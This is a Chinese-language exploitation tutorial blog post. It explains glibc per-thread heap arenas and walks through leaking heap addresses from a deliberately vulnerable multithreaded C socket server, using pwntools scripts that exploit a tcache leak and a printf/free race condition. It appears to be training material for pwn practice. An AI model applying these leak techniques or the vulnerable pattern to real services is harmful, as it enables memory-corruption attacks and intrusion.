---
layout: post
tags: [pwn]
title: "thread-heap : arenas"
author: wsxk
date: 2025-5-3
comments: true
---

- [前言：信息获取是很重要的](#前言信息获取是很重要的)
- [1. multi-thread heap布局: arenas](#1-multi-thread-heap布局-arenas)
  - [1.1 实际例子](#11-实际例子)
  - [1.2 multi-thread: arenas](#12-multi-thread-arenas)
  - [1.3 实操：泄露多线程环境下的堆地址](#13-实操泄露多线程环境下的堆地址)
    - [1.3.1 直接使用tcache泄露地址：截断](#131-直接使用tcache泄露地址截断)
    - [1.3.2 race condition来泄露堆地址](#132-race-condition来泄露堆地址)
    - [1.3.3 用gdb观察内存信息](#133-用gdb观察内存信息)
    - [1.3.4 multi-thread heap：利用](#134-multi-thread-heap利用)


# 前言：信息获取是很重要的<br>
[https://wsxk.github.io/exploitation/](https://wsxk.github.io/exploitation/)<br>
里面提到强大的黑客在攻破一个系统前，最重要的步骤是信息的获取,包括外部侦查和内部侦察两部分。<br>
包括我们之前的漏洞利用技术，如果缺少了某些关键信息，就无法完成，如:<br>
```
1. ROP在不知道程序的地址的情况下，是无法成功利用的
2. heap cache poisoning 经常要求你必须知道你想让heap申请的内存的地址是哪一个
```
目前为止，我们已经用过很多的信息纰漏的技巧，如<br>
```
1. 未初始化的内存
2. heap metadata
3. overlapping allocations
4. bruteforce 多线程canary
```
接下来，我们来了解一下多线程下的信息泄露，尤其是多线程下的heap布局⑧<br>

# 1. multi-thread heap布局: arenas<br>
先前学过了`race condition`这个概念，我们知道，在多线程场景下，`race condition`有相当大的危害。<br>
## 1.1 实际例子<br>
```c
char *messages[16] = { 0 };
int stored[16] = { 0 };

void vuln(FILE *in, FILE *out) {
    fprintf(out, "Welcome to the message server! Commands: malloc/scanf/printf/free/quit.\n");
    char input[1024];
    int idx;

    while (1)
    {
        if (fscanf(in, "%s", input) == EOF) break;
        if (strcmp(input, "quit") == 0) break;
        if (fscanf(in, "%d", &idx) == EOF) break;

        if (strcmp(input, "printf") == 0) {
            if (fprintf(out, "MESSAGE: %s\n", stored[idx] ? messages[idx] : "NONE") < 0) break;
        }
        else if (strcmp(input, "malloc") == 0) {
            if (!stored[idx]) messages[idx] = malloc(1024);
            stored[idx] = 1;
        }
        else if (strcmp(input, "scanf") == 0) {
            fscanf(in, "%1024s", stored[idx] ? messages[idx] : input);
        }
        else if (strcmp(input, "free") == 0) {
            if (stored[idx]) free(messages[idx]);
            stored[idx] = 0;
        }
        else fprintf(stderr, "INVALID COMMAND %s %#llx\n", input, *(unsigned long long*)input);
    }
}

void *handle_connection(void *fd) {
    FILE *in = fdopen((long)fd, "r");
    FILE *out = fdopen((long)fd, "w");
    setvbuf(in, NULL, _IONBF, 0);
    setvbuf(out, NULL, _IONBF, 1);

    fprintf(stderr, "Handling connection on FD %d\n", (int)fd);
    vuln(in, out);
    fprintf(stderr, "Closing connection on FD %d\n", (int)fd);

    close((long)fd);
    pthread_exit(0);
}

int main() {
    int server_fd = socket(AF_INET, SOCK_STREAM, 0);
    int option = 1;
    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &option, sizeof(option));
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(1337);
    bind(server_fd, (struct sockaddr *) &server_addr, sizeof(server_addr));
    listen(server_fd, 4096);

    while (1) {
        pthread_t thread;
        long connection_fd = accept(server_fd, NULL, NULL);
        pthread_create(&thread, NULL, handle_connection, (void *)connection_fd);
    }
}
```
在这种场景下，因为**多线程场景中，没有加锁的安全检查是无效的，因此我们可以无视安全检查，以任意顺序执行malloc，scanf，free，printf操作**<br>
根据我们先前学过的heap知识，只要了解了程序的一些基本信息，我们就可以利用漏洞来获得程序的控制权限了。基本信息如下：<br>
```
1. PIE base (binary address)
2. ASLR base (library addresses)
3. Stack base
4. Heap base
5. Canary
```
通常情况下，我们可以用**tcache的漏洞来泄露heap的基址，但是事实真有那么容易吗？**<br>

## 1.2 multi-thread: arenas<br>
书接上文，要想利用这个漏洞，可以考虑tcache相关的泄露地址的方式，但是跟之前我们遇到的不同（之前的heap只有一个线程），这是一个多线程的程序，各个线程上的堆布局，和主线程的堆布局有一定的区别<br>
**在多线程场景中，多线程利用中泄露的堆地址，其实是线程使用的堆，而不是寻常进程主线程使用的堆地址。**<br>
再来看一个实际的代码案例:<br>
```c
#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>

void * thread_main(void * x){
    printf("addr: %p\n",malloc(1024));
    pthread_exit(0);
}

int main(){
    printf("MAIN addr: %p\n",malloc(1024));
    pthread_t t1,t2,t3,t4;
    pthread_create(&t1,NULL,thread_main,NULL);
    pthread_create(&t2,NULL,thread_main,NULL);
    pthread_create(&t3,NULL,thread_main,NULL);
    pthread_create(&t4,NULL,thread_main,NULL);
    pthread_join(t1,NULL);
    pthread_join(t2,NULL);
    pthread_join(t3,NULL);
    pthread_join(t4,NULL);
}
// gcc arena.c -o arena -lpthread
//strace -f ./arena 2>&1 | grep -E "(mmap|addr)"
```
![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2025-9-25/20250507225852.png)
可以看到**非主线程中的堆分配地址，都是mmap得来的，且有很高的相关性，知道其中一个，就能知道其余线程的堆地址**<br>
在了解了多线程堆的布局后，程序的基本信息就可以更新了:<br>
```
1. PIE base (binary address)
2. ASLR base (library addresses)
3. Stack base
4. Heap base
5. Thread-specific arenas  #新增
6. Canary
```
## 1.3 实操：泄露多线程环境下的堆地址<br>
**回到1.1的代码，如果我们想要利用泄露堆地址，首先可以利用tcache机制进行泄露，这里有一个问题，从1.2的案例我们可以知道，线程堆地址中间部分是有`\x00`字符存在的，而1.1代码中的`fprintf`函数遇到`\x00`字符会截断；如果要利用这个机制泄露地址，我们需要一直申请内存，直到中间没有`\x00`字节才行**<br>
### 1.3.1 直接使用tcache泄露地址：截断<br>
```python
from pwn import *
context.log_level = 'debug'
with process("./test") as p:
    r = remote("localhost",1337)
    r.sendline("malloc 0 malloc 1 malloc 2 free 0 free 1 free 2 malloc 3 printf 3 quit")
    print(r.readall())
```
![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2025-9-25/20250507230140.png)

### 1.3.2 race condition来泄露堆地址<br>
如果我们深入printf函数，我们可以知道，其原理类似于如下代码:<br>
```
int printf_string(the_string) {
    int length = strlen(the_string);
    write(1, the_string, length);
}
```
因此可以利用`race condition`来泄露堆地址！<br>
原理如下:<br>
![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2025-9-25/20250508220532.png)
因为`write需要陷入内核态，和free不用，因此race condition出现的概率并不小`<br>
POC如下:<br>
```python
from pwn import *
import os
# context.log_level = 'debug'

with process("./test") as p:
    r1 = remote("localhost",1337)
    r2 = remote("localhost",1337)
    if os.fork() == 0:
        for _ in range(10000):
            r1.sendline(b"malloc 0 scanf 0 AAAAAAAABBBBBBBB free 0")
        os.kill(os.getpid(),9)
    else:
        for _ in range(10000):
            r2.sendline(b"printf 0")
        print(set(r2.clean().splitlines()))
```
![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2025-9-25/20250508223105.png)

### 1.3.3 用gdb观察内存信息<br>
核心要点是如下两个：<br>
```
1. 查看已知内存地址的固定偏移的周边内存的值
2. 已知的映射page中存放的指针信息
```
还是拿1.1的例子，调试代码如下:<br>
```python
from pwn import *
import os
import time
# context.log_level = 'debug'

with process("./test") as p:
    gdb.attach(p,"continue\n")
    time.sleep(3)
    r1 = remote("localhost",1337)
    r2 = remote("localhost",1337)
    if os.fork() == 0:
        for _ in range(20000):
            r1.sendline(b"malloc 0 scanf 0 AAAAAAAABBBBBBBB free 0")
        os.kill(os.getpid(),9)
    else:
        for _ in range(20000):
            r2.sendline(b"printf 0")
        output = r2.clean()
        output_copy = output
        output = set(output.splitlines())
        print(output)
        pthread_leak = u64(next(x for x in output_copy.split(b"\n") if  b"\x7f" in x)[17:].ljust(8,b"\x00"))
        print(hex(pthread_leak))
        #print(set(r2.clean().splitlines()))
```
![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2025-9-25/20250509224911.png)
gdb调试时，还可以看到上方的libc地址:<br>
![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2025-9-25/20250510105433.png)
其中`0x7ffff7f8db80`就是`main_arena`的地址<br>
![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2025-9-25/20250510105533.png)

### 1.3.4 multi-thread heap：利用<br>
如何实际进行多线程漏洞呢？因为这个漏洞利用起来其实蛮复杂的，因此可以从`primitive`的角度来进行思考:<br>
**攻击原语指的是黑客通过一些列复杂的漏洞组合利用后，获得的可重复使用的能力**<br>
```
Arbitrary Read primitives allow attackers to disclose memory at an attacker-controlled address.

Arbitrary Write primitives allow attackers to overwrite memory at an attacker-controlled address. Often called a write-what-where.

Arbitrary Call allows attackers to redirect control flow (ex: function pointer overwrite).

There are also Relative alternatives, were the attacker controls an offset to a base pointer instead of a full pointer.
Exploit Primitives are building blocks of complex exploits.
```
**通常获得arbitrary read primitive和arbitrary write primitive，我们就能完成攻击了**<br>




<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-C22S5YSYL7"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-C22S5YSYL7');
</script>
